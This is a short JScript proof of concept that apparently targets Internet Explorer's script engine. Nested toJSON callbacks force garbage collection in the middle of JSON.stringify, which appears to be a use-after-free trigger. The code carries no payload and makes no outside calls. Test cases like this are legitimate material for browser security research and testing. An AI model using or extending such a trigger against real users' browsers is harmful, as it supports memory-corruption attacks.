<script language="Jscript.Encode">

var o1 = {toJSON:function(){
  alert('o1');
  return [o2];
}}

var o2 = {toJSON:function(){
  alert('o2');
  CollectGarbage();
  return 'x';
}}

JSON.stringify(o1);

</script>
